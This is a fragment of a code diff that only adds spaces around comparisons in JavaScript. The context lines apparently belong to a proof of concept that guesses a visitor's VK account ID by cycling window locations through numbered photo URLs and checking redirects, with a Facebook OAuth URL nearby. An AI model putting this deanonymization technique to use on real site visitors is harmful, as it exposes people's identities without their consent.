@@ -155,7 +155,7 @@ check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt
 
 var get_assigner = function(from, to){
   return function(w){
-    for(var i=from;i<to;i++){
+    for(var i=from;i < to;i++){
       w.location='http://m.vk.com/photos'+i+'#';
       if(i%100000==0) console.log('checking '+i);
     }
@@ -165,7 +165,7 @@ var vk_base = 'http://m.vk.com/photos';
 var vk_cb=function(guess){
   debug('vk id found: '+ (guess ? 'yes' : 'no'));
 }
-for(var mln=0;mln<2;mln++){
+for(var mln=0;mln < 2;mln++){
   console.log('start ',mln)
   check_redirect(vk_base, vk_cb,get_assigner(mln*1000000,(mln+1)*1000000));
 }
